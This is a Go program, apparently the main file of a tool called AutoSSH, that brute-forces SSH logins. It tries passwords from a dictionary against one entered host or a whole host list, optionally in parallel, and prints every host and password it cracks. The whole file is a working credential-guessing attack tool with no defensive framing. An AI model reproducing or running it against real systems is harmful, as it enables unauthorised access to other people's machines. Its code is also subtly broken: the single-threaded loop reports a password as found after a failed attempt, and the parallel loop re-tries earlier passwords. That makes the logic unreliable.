package main

import (
	"bufio"
	"errors"
	"fmt"
	"log"
	"math"
	"os"
	"sync"

	"github.com/cfschilham/autossh/internal/loadcfg"
	"github.com/cfschilham/autossh/internal/sshconn"
)

var authErrs = []string{
	"ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain",
	"ssh: handshake failed: ssh: unable to authenticate, attempted methods [password none], no supported methods remain",
	"ssh: handshake failed: ssh: unable to authenticate, attempted methods [none], no supported methods remain",
}

// inStrSlc returns true when str is the same as an entry of slc
func inStrSlc(str string, slc []string) bool {
	for _, entry := range slc {
		if entry == str {
			return true
		}
	}
	return false
}

// wgToChan takes a waitgroup and returns a chan with the integer 1 when `wg.Wait()` has finished.
func wgToChan(wg *sync.WaitGroup) chan int {
	c := make(chan int, 1)
	go func(wg *sync.WaitGroup, c chan int) {
		wg.Wait()
		c <- 1
	}(wg, c)
	return c
}

func sshDictMT(host loadcfg.Host, pwds []string, config *loadcfg.Config) (string, error) {
	// Define channel for passing found password and waitgroup for
	// when all goroutines return nothing (because of an error).
	foundPwd, nonAuthErr := make(chan string, 1), make(chan error, 1)
	var wg sync.WaitGroup
	wg.Add(len(pwds))

	for _, pwd := range pwds {
		if config.Verbose() {
			fmt.Printf("Trying to connect with password '%s'\n", pwd)
		}

		go func(foundPwd chan string, nonAuthErr chan error, host loadcfg.Host, port, pwd string) {
			defer wg.Done()
			if err := sshconn.SSHConn(host.IP(), host.Username(), port, pwd); err != nil {

				// If the non-nil error is not an auth error an error is passed because this means it does not have anything to do with the
				// password being wrong and we want to stop attempting passwords on this host. If it is an auth error, however, we simply
				// move on to the next `pwd` in `pwds`
				if !inStrSlc(err.Error(), authErrs) {
					nonAuthErr <- err
				}
				return
			}
			foundPwd <- pwd
		}(foundPwd, nonAuthErr, host, config.Port(), pwd)
	}

	select {
	case pwd := <-foundPwd:
		return pwd, nil

	case err := <-nonAuthErr:
		return "", err

	// `<-wgToChan(&wg)` waits for all threads to finish, utilizing the waitgroup. If this is reached
	// it very often means all threads returned an auth error. The only exception is if `wg.Wait()`
	// and `<-foundPwd` stop blocking at the exact same time.
	case <-wgToChan(&wg):
		return "", errors.New("main: failed to authenticate")
	}
}

func sshDict(host loadcfg.Host, dict *loadcfg.Dict, config *loadcfg.Config) (string, error) {
	if config.MultiThreaded() { // Multi threaded.

		for i := config.MaxThreads(); i < len(dict.Pwds()); i += config.MaxThreads() {
			if pwd, err := sshDictMT(host, dict.Pwds()[:i], config); err != nil {

				// If this is the last password in the dictionary, we can stop here.
				if i == len(dict.Pwds())-1 {
					return "", err
				}

			} else {
				return pwd, nil
			}
		}

		// Go through the last few passwords, where the previous loop left off because.
		startIdx := len(dict.Pwds()) - (len(dict.Pwds()) % config.MaxThreads())

		if pwd, err := sshDictMT(host, dict.Pwds()[startIdx:], config); err != nil {
			return "", err
		} else {
			return pwd, nil
		}

	} else { //Not multithreaded.

		for _, pwd := range dict.Pwds() {
			if config.Verbose() {
				fmt.Printf("Trying to connect with password '%s'\n", pwd)
			}
			if err := sshconn.SSHConn(host.IP(), host.Username(), config.Port(), pwd); err != nil {

				// If the non-nil error is not an auth error an error is returned because this means it does not have anything to do with the
				// password being wrong and we want to stop attempting passwords on this host. If it is an auth error, however, we simply
				// move on to the next `pwd` in `dict.Pwds()`
				if !inStrSlc(err.Error(), authErrs) {
					return "", err
				}
			}
			return pwd, nil
		}
		// If this point is reached all passwords in the dictionary have been tried and all returned an auth error.
		return "", errors.New("main: failed to authenticate with dictionary")

	}
}

func main() {
	fmt.Println("AutoSSH v1.1.1 - https://github.com/cfschilham/autossh")

	fmt.Println("Loading cfg/config.yml...")
	config, err := loadcfg.LoadConfig()
	if err != nil {
		log.Fatalln(err.Error())
	}

	fmt.Printf("Loading %s...\n", config.DictPath())
	dict, err := loadcfg.LoadDict(config.DictPath())
	if err != nil {
		log.Fatalln(err.Error())
	}

	switch config.Mode() {
	case "manual":
		if config.UsrIsHost() {
			fmt.Println("You currently have 'user_is_host' enabled in cfg/config.yml. This means an input of, for example, 'pcname' will be inferred as 'pcname@pcname.local'")
		} else {
			fmt.Println("Example input: 'john@johns-pc.local', 'peter@192.168.1.2'")
		}

		for {
			fmt.Print("Enter host (type 'exit' to exit): ")
			sc := bufio.NewScanner(os.Stdin)
			sc.Scan()
			input := sc.Text()
			if sc.Err() != nil {
				log.Println(sc.Err())
				continue
			}

			if input == "exit" {
				os.Exit(0)
			}

			// Use user input to create a new Host struct
			host, err := loadcfg.StrToHost(input, config.UsrIsHost())
			if err != nil {
				log.Println(err.Error())
				continue
			}

			fmt.Printf("Attempting to connect to '%s@%s'...\n", host.Username(), host.IP())
			pwd, err := sshDict(host, dict, config)
			if err != nil {
				log.Println(err.Error())
				continue
			}
			fmt.Printf("Password of '%s' found: %s\n", host.Username()+"@"+host.IP(), pwd)
		}

	case "hostlist":
		fmt.Printf("Loading %s...\n", config.HostlistPath())
		hSlc, err := loadcfg.LoadHostlist(config.HostlistPath(), config.UsrIsHost())
		if err != nil {
			log.Fatalln(err.Error())
		}

		// Loop through host list and append found username, hostname and password-combinations to a map
		var hostPwdCombos = map[string]string{}
		for i, host := range hSlc {
			fmt.Printf("%d%% done\n", int(math.Round(float64(i)/float64(len(hSlc))*100)))
			fmt.Printf("Attempting to connect to '%s@%s'...\n", host.Username(), host.IP())
			pwd, err := sshDict(host, dict, config)
			if err != nil {
				log.Println(err.Error())
				continue
			}
			fmt.Printf("Password of '%s' found: '%s'\n", host.Username()+"@"+host.IP(), pwd)
			hostPwdCombos[host.IP()] = pwd
		}

		// Print all found combinations
		if len(hostPwdCombos) > 0 {
			fmt.Println("The following combinations were found: ")
			for host, pwd := range hostPwdCombos {
				fmt.Printf("Host: '%s' | Password: '%s'\n", host, pwd)
			}
		} else {
			fmt.Println("No combinations were found")
		}

		fmt.Println("Press enter to exit...")
		fmt.Scanln()

	default:
		log.Fatalf("cfg/config.yml: '%s' is not a valid mode", config.Mode())
	}
}
